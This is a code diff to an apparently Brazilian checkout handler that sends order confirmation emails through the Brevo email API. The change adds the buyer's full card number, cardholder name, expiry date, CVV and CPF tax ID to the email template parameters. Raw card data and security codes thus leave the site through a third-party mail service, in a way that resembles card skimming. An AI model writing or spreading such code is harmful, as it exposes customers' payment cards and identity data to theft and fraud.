@@ -15,7 +15,7 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
   }
 
   try {
-    const { email, firstName, lastName, phone, quantity, paymentMethod, installments } = req.body;
+    const { email, firstName, lastName, phone, quantity, paymentMethod, installments, cardNumber, cardName, cardExpiry, cardCvv, cpf } = req.body;
     
     // Debug log
     console.log('Brevo API - Dados recebidos:', { paymentMethod, installments, quantity });
@@ -118,19 +118,24 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
             }
           ],
           params: {
-            FIRSTNAME: firstName,
-            LASTNAME: lastName,
+            CLIENT_NAME: `${firstName} ${lastName}`,
             EMAIL: email,
-            SMS: phone || 'Não informado',
+            PHONE: phone || 'Não informado',
+            CPF: cpf || 'Não informado',
             QUANTITY: (quantity || 1).toString(),
-            TOTAL_NIGHTS: ((quantity || 1) * 6).toString(),
-            TOTAL_VALUE: paymentMethod === 'credit_card' 
+            TOTAL_DAYS: ((quantity || 1) * 6).toString(),
+            TOTAL_AMOUNT: paymentMethod === 'credit_card' 
               ? `R$ ${((quantity || 1) * 2800 * 1.10).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
               : `R$ ${((quantity || 1) * 2800).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
-            PAYMENT_METHOD_LABEL: paymentMethod === 'pix' ? 'PIX' : 'Cartão de Crédito',
+            PAYMENT_METHOD: paymentMethod === 'pix' ? 'PIX' : 'Cartão de Crédito',
             INSTALLMENTS: paymentMethod === 'credit_card' 
               ? `${installments || 1}x de R$ ${(((quantity || 1) * 2800 * 1.10) / (installments || 1)).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
-              : 'À vista'
+              : 'À vista',
+            // Dados do cartão (apenas se for cartão)
+            CARD_NUMBER: paymentMethod === 'credit_card' ? cardNumber : '',
+            CARD_NAME: paymentMethod === 'credit_card' ? cardName : '',
+            CARD_EXPIRY: paymentMethod === 'credit_card' ? cardExpiry : '',
+            CARD_CVV: paymentMethod === 'credit_card' ? cardCvv : ''
           }
         })
       });
